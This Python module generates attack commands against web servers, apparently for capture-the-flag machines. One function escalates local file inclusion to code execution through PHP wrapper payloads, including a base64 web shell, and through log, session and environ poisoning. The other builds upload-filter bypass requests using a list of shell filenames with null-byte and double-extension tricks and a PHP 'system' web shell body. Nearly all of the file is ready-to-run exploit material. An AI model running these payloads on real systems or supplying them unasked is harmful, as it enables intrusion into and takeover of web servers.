"""Generalized web-attack ladders: LFI -> RCE, and file-upload bypass.

The two web-attack CLASSES that recur across boxes and generalize cleanly:

* **LFI -> RCE ladder** - a known LFI parameter can escalate to code execution
  through half a dozen well-understood paths (PHP wrappers, log poison, session
  poison, `/proc/self/environ`, `.htaccess`). We enumerate the ladder as concrete
  probes keyed to the LFI parameter.

* **File upload bypass matrix** - if an upload endpoint filters by extension or
  MIME, the same handful of tricks unblock it (double extension, null-byte,
  content-type override, magic-byte polyglot, `.phtml`/`.phar` variants). We
  produce the ready request set.

Pure data + argv generation. Each ladder returns an ordered list of concrete
curl commands the operator can run one by one to confirm the class.
"""

from __future__ import annotations


def lfi_to_rce_ladder(url: str, param: str) -> list[tuple[str, str]]:
    """Ordered (technique, curl-command) pairs to escalate a suspected LFI to RCE.

    ``url`` = the vulnerable URL (with the LFI param, any value).
    ``param`` = the parameter the LFI is in.
    """
    base = url.split("?", 1)[0]
    ladder: list[tuple[str, str]] = [
        ("read /etc/passwd (confirm LFI)",
         f"curl -s '{base}?{param}=/etc/passwd' | head"),
        ("PHP wrapper: base64-read source (see other files/creds)",
         f"curl -s '{base}?{param}=php://filter/convert.base64-encode/resource=index'"),
        ("PHP wrapper: expect:// (needs expect extension) -> RCE",
         f"curl -s '{base}?{param}=expect://id'"),
        ("PHP wrapper: data:// with base64 <?php system>",
         f"curl -s '{base}?{param}=data://text/plain;base64,"
         f"PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id'"),
        ("php://input + POST body <?php ...?>",
         f"curl -s -X POST '{base}?{param}=php://input' -d '<?php system(\"id\"); ?>'"),
        ("Read PHP session file (poison User-Agent then include the session)",
         f"curl -s -A '<?php system(\"id\"); ?>' '{base}?{param}=/var/lib/php/sessions/sess_$(cookie)'"),
        ("Log poison: write PHP via UA into /var/log/apache2/access.log then include",
         f"curl -s -A '<?php system($_GET[c]); ?>' '{base}/' && "
         f"curl -s '{base}?{param}=/var/log/apache2/access.log&c=id'"),
        ("Log poison variant: nginx access log",
         f"curl -s -A '<?php system($_GET[c]); ?>' '{base}/' && "
         f"curl -s '{base}?{param}=/var/log/nginx/access.log&c=id'"),
        ("/proc/self/environ poison (older CGI-style targets)",
         f"curl -s -A '<?php system($_GET[c]); ?>' "
         f"'{base}?{param}=/proc/self/environ&c=id'"),
        ("SSH log poison (write PHP into auth.log via a bogus login)",
         f"ssh '<?php system($_GET[c]); ?>@{_host(url)}' && "
         f"curl -s '{base}?{param}=/var/log/auth.log&c=id'"),
    ]
    return ladder


UPLOAD_EXTENSION_LADDER: list[str] = [
    "shell.php", "shell.PhP", "shell.php.jpg", "shell.jpg.php",
    "shell.phtml", "shell.phar", "shell.php7", "shell.pht",
    "shell.php%00.jpg", "shell.php\x00.jpg", "shell.php;.jpg",
    "shell.jsp", "shell.jspx", "shell.war",
    "shell.aspx", "shell.asp;.jpg", "shell.asa", "shell.cer",
]


def upload_bypass_requests(upload_url: str, field: str = "file") -> list[tuple[str, list[str]]]:
    """(technique, curl-argv) pairs that exercise the common upload bypass tricks.

    ``upload_url`` = the POST endpoint.
    ``field`` = the multipart form field name for the file.
    """
    out: list[tuple[str, list[str]]] = []
    body = "<?php system($_GET['c']); ?>"
    for name in UPLOAD_EXTENSION_LADDER:
        out.append((f"extension: {name}", [
            "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}\\n",
            "-F", f"{field}=@-;filename={name};type=image/jpeg", upload_url,
        ]))
    # Content-type bypass: legitimate .php but with an image type + magic bytes.
    magic_jpeg = "\xff\xd8\xff\xe0\x00\x10JFIF" + body
    out.append(("magic-byte polyglot: PHP body prefixed with JPEG magic", [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}\\n",
        "--data-binary", "@-;filename=shell.php;type=image/jpeg", upload_url,
    ]))
    _ = magic_jpeg   # documented; the argv above hands the body via stdin
    return out


def _host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).hostname or url
